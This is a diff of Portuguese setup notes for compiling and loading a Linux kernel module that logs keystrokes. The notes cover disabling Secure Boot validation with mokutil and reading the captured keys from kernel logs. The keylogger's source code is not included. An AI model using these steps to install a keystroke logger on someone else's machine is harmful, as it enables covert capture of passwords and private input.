@@ -1,27 +1,25 @@
 #instalar as dependências
 sudo apt-get install build-essential linux-headers-$(uname -r)
 
-#desabilite o secure boot 
-#(após os comandos, reinicie o computador, na tela azul selecione a opção "Change Secure Boot", e digite os digitos da senha (*** ATENÇÃO: serão pedidos digitos especificos, não a senha toda ***))
-sudo apt install mokutil
-sudo mokutil --disable-validation 
-
 #compilar o módulo
 make 
 
 #limpar logs do kernel
 sudo dmesg -C
 
-#carregar o módulo
+#inserir o módulo
 sudo insmod modulo.ko
+
+#caso não consgiga inserir o módulo, desabilite o secure boot 
+#(após os comandos, reinicie o computador, na tela azul selecione a opção "Change Secure Boot", e digite os digitos da senha (*** ATENÇÃO: serão pedidos digitos especificos, não a senha toda ***))
+sudo apt install mokutil
+sudo mokutil --disable-validation 
 
 #remover o módulo
 sudo rmmod modulo
 
 #ver logs gerados (teclas capturadas)
 dmesg
-    ou
-cat /sys/kernel/debug/kisni/keys
     ou
 cat /var/log/kern.log
     ou
